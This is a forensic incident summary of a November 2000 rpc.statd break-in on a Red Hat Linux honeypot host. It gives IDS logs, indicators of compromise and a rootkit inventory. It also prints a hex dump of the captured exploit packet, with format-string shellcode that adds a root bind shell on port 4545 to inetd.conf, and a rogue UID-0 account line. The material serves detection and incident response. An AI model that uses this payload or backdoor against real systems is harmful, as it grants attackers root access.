@@ -1,0 +1,243 @@
+The following is a summary of the intrusion into the host
+apollo.honeyp.edu.  This summary is based on information detailed
+in the file "evidence.txt".
+
+On November 7, 2000, a Red Hat Linux 6.2 server belonging to
+honeyp.edu was compromised.  Analysis of the system confirms the
+attacker broke in through the rpc.statd daemon, a Network File System
+service.  This vulnerability was made public July 16, 2000 and CERT
+released an Advisory on August 18, 2000:
+
+    http://www.cert.org/advisories/CA-2000-17.html
+
+CERT has listed this as vulnerbility #34043:
+
+    http://www.kb.cert.org/vuls/id/34043
+
+See these references for patches and apply them immediately.
+
+The attack had the following signature as seen by the intrusion
+detection system (snort) in use:
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+Nov 7 23:11:06 lisa snort[1260]: RPC Info Query: 216.216.74.2:963 -> 172.16.1.107:111
+Nov 7 23:11:31 lisa snort[1260]: spp_portscan: portscan status from 216.216.74.2: 2 connections across 1 hosts: TCP(2), UDP(0)
+Nov 7 23:11:31 lisa snort[1260]: IDS08 - TELNET - daemon-active: 172.16.1.101:23 -> 216.216.74.2:1209
+Nov 7 23:11:34 lisa snort[1260]: IDS08 - TELNET - daemon-active: 172.16.1.101:23 -> 216.216.74.2:1210
+Nov 7 23:11:47 lisa snort[1260]: spp_portscan: portscan status from 216.216.74.2: 2 connections across 2 hosts: TCP(2), UDP(0)
+Nov 7 23:11:51 lisa snort[1260]: IDS15 - RPC - portmap-request-status: 216.216.74.2:709 -> 172.16.1.107:111
+Nov 7 23:11:51 lisa snort[1260]: IDS362 - MISC - Shellcode X86 NOPS-UDP: 216.216.74.2:710 -> 172.16.1.107:871
+
+11/07-23:11:50.870124 216.216.74.2:710 -> 172.16.1.107:871
+UDP TTL:42 TOS:0x0 ID:16143 
+Len: 456
+3E D1 BA B6 00 00 00 00 00 00 00 02 00 01 86 B8  >...............
+00 00 00 01 00 00 00 02 00 00 00 00 00 00 00 00  ................
+00 00 00 00 00 00 00 00 00 00 01 67 04 F7 FF BF  ...........g....
+04 F7 FF BF 05 F7 FF BF 05 F7 FF BF 06 F7 FF BF  ................
+06 F7 FF BF 07 F7 FF BF 07 F7 FF BF 25 30 38 78  ............%08x
+20 25 30 38 78 20 25 30 38 78 20 25 30 38 78 20   %08x %08x %08x 
+25 30 38 78 20 25 30 38 78 20 25 30 38 78 20 25  %08x %08x %08x %
+30 38 78 20 25 30 38 78 20 25 30 38 78 20 25 30  08x %08x %08x %0
+38 78 20 25 30 38 78 20 25 30 38 78 20 25 30 38  8x %08x %08x %08
+78 20 25 30 32 34 32 78 25 6E 25 30 35 35 78 25  x %0242x%n%055x%
+6E 25 30 31 32 78 25 6E 25 30 31 39 32 78 25 6E  n%012x%n%0192x%n
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90  ................
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90  ................
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90  ................
+90 90 EB 4B 5E 89 76 AC 83 EE 20 8D 5E 28 83 C6  ...K^.v... .^(..
+20 89 5E B0 83 EE 20 8D 5E 2E 83 C6 20 83 C3 20   .^... .^... .. 
+83 EB 23 89 5E B4 31 C0 83 EE 20 88 46 27 88 46  ..#.^.1... .F'.F
+2A 83 C6 20 88 46 AB 89 46 B8 B0 2B 2C 20 89 F3  *.. .F..F..+, ..
+8D 4E AC 8D 56 B8 CD 80 31 DB 89 D8 40 CD 80 E8  .N..V...1...@...
+B0 FF FF FF 2F 62 69 6E 2F 73 68 20 2D 63 20 65  ..../bin/sh -c e
+63 68 6F 20 34 35 34 35 20 73 74 72 65 61 6D 20  cho 4545 stream 
+74 63 70 20 6E 6F 77 61 69 74 20 72 6F 6F 74 20  tcp nowait root 
+2F 62 69 6E 2F 73 68 20 73 68 20 2D 69 20 3E 3E  /bin/sh sh -i >>
+20 2F 65 74 63 2F 69 6E 65 74 64 2E 63 6F 6E 66   /etc/inetd.conf
+3B 6B 69 6C 6C 61 6C 6C 20 2D 48 55 50 20 69 6E  ;killall -HUP in
+65 74 64 00 00 00 00 09 6C 6F 63 61 6C 68 6F 73  etd.....localhos
+74 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  t...............
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
+
+The intruder installed an IRC "bot" (eggdrop) on the system.
+You may see connections to any/all of the following IP addresses
+associated with this bot (you may wish to monitor traffic to these
+IP addresses):
+
+207.138.35.60   irc.west.gblx.net
+198.94.52.220   irc.Stanford.EDU
+130.243.35.1
+207.45.69.69    irc.lightning.net
+192.16.122.4
+199.2.32.11     irc-w1.concentric.net
+206.251.7.30    irc.Prison.NET
+206.132.27.156  irc.east.gblx.net
+
+
+The intruder has installed a "root kit", which prevents standard
+operating system commands (and standard techniques) from showing the
+intruder's presense.  Skilled administrators or incident response
+handlers will be necessary to deal completely and effectively with
+such an intrusion.
+
+[Q3] The intruder replaces (at minimum) the following operating system
+programs:
+
+	/bin/ls
+	/bin/netstat
+	/bin/ps
+	/sbin/ifconfig
+	/usr/bin/top
+	/usr/local/sbin/sshd1
+	/usr/sbin/syslogd
+	/usr/sbin/tcpd
+
+Processes being hidden include those with the strings (create
+a script with one of these names, which sleeps for 60 seconds before
+exiting, and see if "ps" or "top" will not show it):
+
+	slice2
+	snif
+	pscan
+	imp
+	qd
+	bs.sh
+	nn
+	egg.lin
+
+Files/directories being hidden include those with the strings
+(touch a file with one of these names and see if "ls" will show it):
+
+	.tp
+	tcp.log
+	slice2
+	.p
+	.a
+	.l
+	scan
+	a
+	p
+	addy.awk
+	qd
+	imp
+	.fakeid
+
+Network connections may originate from the following network blocks
+(you may wish to monitor traffic to/from these network blocks):
+
+	63.203.0.0/16
+	63.206.0.0/16
+	209.250.0.0/16
+	216.33.0.0/16
+
+Destination ports used by back doors include (you may wish to log
+traffic to/from these ports, or what for these on your IDS):
+
+	4545/tcp
+	113/tcp
+	35350/tcp
+
+Also observed on the compromised system are the following.
+
+These command history files are linked to /dev/null:
+
+	/.bash_history
+	~games/.bash_history
+	/root/.bash_history
+	/tmp/.bash_history
+	/usr/games/.bash_history
+
+These files/directories are installed/modified:
+
+	/bin/bx
+	/dev/ptyp
+	/etc/hosts.deny
+	/etc/inetd.conf
+	/etc/rc.d/rc.local
+	/etc/sshd_config
+	/usr/local/bin/addr
+	/usr/local/bin/dig
+	/usr/local/bin/dnsquery
+	/usr/local/bin/host
+	/usr/local/bin/make-ssh-known-hosts
+	/usr/local/bin/make-ssh-known-hosts1
+	/usr/local/bin/mkservdb
+	/usr/local/bin/nsupdate
+	/usr/local/bin/scp
+	/usr/local/bin/scp1
+	/usr/local/bin/slogin
+	/usr/local/bin/ssh
+	/usr/local/bin/ssh1
+	/usr/local/bin/ssh-add
+	/usr/local/bin/ssh-add1
+	/usr/local/bin/ssh-agent
+	/usr/local/bin/ssh-agent1
+	/usr/local/bin/ssh-keygen
+	/usr/local/bin/ssh-keygen1
+	/usr/local/sbin/irpd
+	/usr/local/sbin/named
+	/usr/local/sbin/named-bootconf
+	/usr/local/sbin/ndc
+	/usr/local/sbin/sshd
+	/usr/local/sbin/sshd1
+	/usr/man/.a
+	/usr/man/.Ci
+	/usr/man/p
+	/usr/man/.p
+	/usr/man/r
+	/usr/sbin/in.ftpd
+	/usr/sbin/in.identd
+	/var/log/wtmp
+	/var/tmp/nap
+
+File permissions are changed (to 0700) on these programs:
+
+	/bin/ping
+	/sbin/dump
+	/sbin/restore
+	/usr/bin/at
+	/usr/bin/chage
+	/usr/bin/gpasswd
+	/usr/bin/newgrp
+	/usr/bin/suidperl
+	/usr/libexec/pt_chown
+	/usr/sbin/traceroute
+	/usr/sbin/userhelper
+	/usr/sbin/usernetctl
+	/usr/X11R6/bin/Xwrapper
+
+Files matching this wildcard expression are deleted from the system:
+
+	/etc/rc.d/init.d/*log*
+
+Temporarily (immediately following the initial intrusion), there are
+two accounts visible in /etc/passwd and /etc/shadow.  These accounts
+are:
+
+	own:x:0:0::/root:/bin/bash
+	adm1:x:5000:5000:Tech Admin:/tmp:/bin/bash
+
+The majority of these modifications are performed by scripts,
+so the signature of the attack would be similar for other systems.
+These changes take place over a very short period of time, so even
+once daily monitoring may not catch these changes.  It is assumed that
+the attack itself is also automated, with scanning of entire network
+ranges being done for a common vulnerability (Linux rpc.statd, in this
+case.)
+
+Because of the use of a "rootkit", caution should be taken in
+investigating the system.  Unless you are familiar with dealing with
+rootkits, the likelihood of a false negative (seeing nothing amiss
+because of the rootkit) is high.
+
+While there was no obvious booby trap that would cause the system to
+not reboot (e.g., destruction of boot blocks or partition tables), it
+may not be trivial to identify all the files listed above.  Methods
+for getting around this type of rootkit include MD5 checksum
+comparisons and timestamp analysis of a mirror image of the partitions
+(which can be obtained by copying them over the network using "dd" and
+"nc").  For more information on these two alternatives, see:
+
+	http://staff.washington.edu/dittrich/misc/faqs/rootkits.faq
+	http://staff.washington.edu/dittrich/misc/forensics/
